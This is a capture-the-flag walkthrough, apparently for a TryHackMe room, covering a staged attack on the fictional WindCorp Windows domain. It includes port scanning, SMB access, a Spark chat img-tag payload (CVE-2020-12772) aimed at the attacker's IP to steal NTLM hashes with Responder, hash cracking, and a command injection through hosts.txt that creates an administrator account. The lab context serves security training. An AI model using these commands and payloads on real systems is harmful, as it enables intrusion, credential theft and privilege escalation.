item.title: Enumeration
item.description:
#Attacking_Machine #Attacking_Machine
You need to see what ports are open on the victim machine.
Instead of nmap you can use rustscan.

RustScan is a modern, fast, and efficient port scanner built using the Rust programming language. It aims to be significantly faster than traditional port scanners like Nmap, especially for large-scale scans, by leveraging Rustâ€™s performance and concurrency features.



Blazing fast: Scans thousands of ports in seconds.
Parallelism: Utilizes multiple threads to maximize scanning speed.
Nmap integration: Automatically hands off discovered ports to Nmap for detailed service/version detection.
Low resource usage: Lightweight and efficient.

rustscan -b 2500 -a 10.10.22.212 -t 2000 --ulimit 5000 -- -A -sC -sV --script vuln

A lot of open ports identified by rustscan/nmap but you must be interested about those ones first.

80/tcp open http syn-ack Microsoft IIS httpd 10.0
135/tcp open msrpc syn-ack Microsoft Windows RPC
139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name) 443/tcp open ssl/http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp open microsoft-ds? syn-ack
3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
5262/tcp open jabber syn-ack Ignite Realtime Openfire Jabber server 3.10.0 or later

You can see the domain on the resulls:
Domain: windcorp.thm0
#Attacking_Machine
Add the domain to the /etc/hosts file.
10.10.22.212 windcorp.thm0

Visit http://windcorp.thm0/.
Look for the technologies with Wappalizer.

Click on the Reset Password button.

You'll see a subdomain page you can't reach.

#Attacking_Machine
Add the subdomain fire.windcorp.thm to /etc/hosts.
Reload the page.


On the main web page you can see the names of several staff members.



Create a file with all employees' names. (site_emploees.txt) Antonietta Vidal
Britney Palmer
Brittany Cruz
Carla Meyer
Buse Candan
Edeltraut Daub
Edward Lewis
Emile Lavoie
Emile Henry
Emily Anderson
Hemmo Boschma
Isabella Hughes
Isra Saur
Jackson Vasquez
Jaqueline Dittmer
Emily Jensen
Lily Levesque
Kirk Iglas
Create another file with the first name in one row and the middle name in the next one. (users.txt)
cat site_emploees.txt| tr -s ' ' '\n' > users.txt cat users.txt
Antonietta Vidal Britney Palmer Brittany Cruz Carla Meyer Buse Candan Edeltraut Daub Edward Lewis Emile Lavoie Emile Henry Emily Anderson Hemmo Boschma Isabella Hughes Isra Saur Jackson Vasquez Jaqueline Dittmer Emily Jensen Lily Levesque Kirk Iglas

Grep those names from all web pages.
curl http://fire.windcorp.thm | egrep -i -f users.txt

You can see there's an image called lilyleAndSparky.jpg, so, you can reset the password because you know her pet's name.

Change the password with lilyle:Sparky credentials.

Next step: SMB enumeration and Flag 1

item.title: Install OpenJDK 8 on Kali Linux
item.description:
#Attacking_Machine #Attacking_Machine #Attacking_Machine #Attacking_Machine #Attacking_Machine
Kali removed OpenJDK 8 from default repositories, so we have to install it manually.

#Attacking_Machine
wget https://github.com/adoptium/temurin8-binaries/releases/download/jdk8u392-b08/OpenJDK8U-jre_x64_linux_hotspot_8u392b08.tar.gz

#Attacking_Machine
tar -xvf OpenJDK8U-jre_x64_linux_hotspot_8u392b08.tar.gz
This will create a folder like jdk8u392-b08-jre.


#Attacking_Machine
sudo mv jdk8u392-b08-jre /opt/java8
Now Java 8 is stored under /opt/java8.

#Attacking_Machine
Temporary for now (for current terminal):
export JAVA_HOME=/opt/java8 export PATH=$JAVA_HOME/bin:$PATH

#Attacking_Machine
java -version
âœ… It should now say something like:
openjdk version "1.8.0_392" OpenJDK Runtime Environment ...
Next step: Spark Messenger

item.title: SMB enumeration and Flag 1
item.description:
#Attacking_Machine #smbclient #Attacking_Machine
There's a SMB port open: 445/tcp open microsoft-ds

smbmap is a post-exploitation and enumeration tool used by penetration testers and security researchers to interact with and enumerate information from SMB (Server Message Block) shares on Windows systems. It's particularly useful for identifying misconfigurations, accessible shares, and even downloading/uploading files if permissions allow.


Enumerate SMB shares
Check permissions (READ, WRITE, EXECUTE)
Download/upload files
Execute commands remotely (if access permits)
Identify share and directory access rights quickly

#Attacking_Machine
smbmap -u lilyle -p ChangeMe#1234 -d windcorp.thm -H fire.windcorp.thm


Run smbclient to see what there is on the Shared Disc.
smbclient \\\\10.10.189.54\\Shared -U lilyle%ChangeMe#1234


#smbclient
get "Flag 1.txt"
#Attacking_Machine
cat 'Flag 1.txt'
Flag 1 THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}
Next step: Spark Messenger

item.title: Spark Messenger
item.description:
#smbclient #Attacking_Machine #Attacking_Machine #sSpark
You can notice that in the same flag;'s directory there some files starting with "spark".
There's a .deb file and you can see what its content is.
#smbclient

Download the spark* files.
mget spark*
#Attacking_Machine

Look at spark_2_8_3.deb content.
dpkg-deb -I spark_2_8_3.deb


As this program pre-Depends: openjdk-8-jre | oracle-java8-jre. You can install this packages following the steps oon Install OpenJDK 8 on Kali Linux.


Extract the .deb manually without installing:
dpkg-deb -x spark_2_8_3.deb extracted-spark
This unpacks the .deb into the extracted-spark folder.

Search for any spark launcher script. In the top extracted folder (where you unpacked spark_2_8_3.deb or .tar.gz), do:
find . -type f -name "spark"cd extracted-spark find . -name "*.jar"
Look for small executable files â€” not .jar files.

Assuming you're in the folder where you extracted, then:
cd usr/share/spark java -cp "lib/*" org.jivesoftware.launcher.Startup



Intreoduce the following data on the form:
Username: lilyle
Password: ChangeMe#1234
Domain: fire.windcorp.thm
Go to the advanced settings and disabled these options.

You are logged.

If you look up on the internet you'll find an interesting CVE-2020-12772 vulnerability.
Visit https://nvd.nist.gov/vuln/detail/CVE-2020-12772.


If you go to https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md you can see how the authors found the way of exploiting the vulnerability.

When you opened a chat with another user, you could send an <img  tag to that user with an external URL as the source of that image, like this:
<img src=http://<your attaching machine IP>/test.img>
Each time the user clicks the link, or the ROAR module automatically preloads it, the external server receives the request for the image, together with the NTLM hashes from the user that visits the link, i.e. the user you are chatting with!

#Attacking_Machine
Run the following to be able to catch the hash when it comes.
sudo responder -I tun0


#sSpark

Go to Options->Start a Chat.
After enter an address you'll have a window to chat.
Send the message: <img src=http://10.9.1.138/test.img>.
After a while you'll get the hash on the responder terminal.

Next step: Cracking the hash

item.title: Cracking the hash
item.description:
#Attacking_Machine
#Attacking_Machine

Copy the hash from the previous step to a file.
echo "buse::WINDCORP:abbd718d4ffb355f:D4F29FD7250BD6F895CE4BC5028E1D24:" > busehash.txt

Run John to decode it.
john busehash.txt -w=/usr/share/wordlists/rockyou.txt --pot=john.pot --format=netntlmv2

Hash cracked uzunLM+3131

item.title: Enumeration
item.description:
#Winrm_Shell #Winrm_Shell #Winrm_Shell #Attacking_Machine #smbclient #Attacking_Machine #smbclient #Attacking_Machine
You have a reverse shell on the third and final target.
Start with some manual enumeration and hopefully come up with something workable!
#Winrm_Shell
If you do some recon manually you'll find a directory called scripts with two files:

The most interesting one is a powershell script named checkservers.ps1 that belong to administrator.
Looking into the code you find out:

The script reads a file named hosts.txt owned by brittanycr.
get-content C:\Users\brittanycr\hosts.txt
The ps1 script is executed every x time consuming the hosts.txt file and passing itâ€™s content to Invoke-Expression.
# Read the File with the Hosts every cycle, this way to can add/remove hosts # from the list without touching the script/scheduled task, # also hash/comment (#) out any hosts that are going for maintenance or are down. get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} | ForEach-Object { $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue" Invoke-Expression $p <====================
Note So if we gain access to brittanycr account by changing itâ€™s password and changing the content of hosts.txt file to our payload, we can get it executed as Administrator

#Winrm_Shell
Run the following command to the privilege of the current user:
whoami /priv

Look at the groups.
whoami /groups

According to Microsoft.

It means that we can change user passwords.

#Winrm_Shell
net user brittanycr SuperPassword123

Note You won't be able to log in via Evil-winrm with these credentials.

#Attacking_Machine
Try to login via SMB.
smbclient //windcorp.thm0/users -U brittanycr

Go to brittanycr's directory and list the files.
cd brittanycr dir


#smbclient

Download the hosts.txt file.
get hosts.txt
#Attacking_Machine

Add a new user to hosts.txt.
google.com bing.com yahoo.com ; net user iobreaker 'P+ssword123' /add; net localgroup Administrators iobreaker /add
#smbclient

Upload the file.
put hosts.txt

#Attacking_Machine
Run crackmapexec.
cme winrm fire.windcorp.thm -u 'iobreaker' -p 'P+ssword123'

So, now you'll be able to login with an adminstrator's group accouont.
Next step: Admin shell and Third Flag

item.title: Getting a shell and flag 2
item.description:
#Attacking_Machine #Attacking_Machine #Winrm_Shell
You have a valid User with credentials.
User: buse
Password: uzunLM+3131

#Attacking_Machine
Crackmapexec (CME)** is an excellent tool for enumerating and testing credentials across SMB, WinRM, and other Windows services. Here's how you can use it in your situation.
crackmapexec winrm 10.10.75.173 -u buse -p uzunLM+3131

The results are: You can run winrm with the given credentials.

#Attacking_Machine
Connect to the machine using
evil-winrm -i windcorp.thm0 -u Buse -p uzunLM+3131

#Winrm_Shell
Go to C:\Users\buse\desktop.
cd C:\Users\buse\desktop cat "Flag 2.txt"
Flag 2 THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
Next step: Enumeration

item.title: Index
item.description:
Story
You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).
Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?
Happy Hacking! 
@4nqr34z and @theart42
(Give it at least 5 minutes to boot)
Note Remember to connect to the VPN.
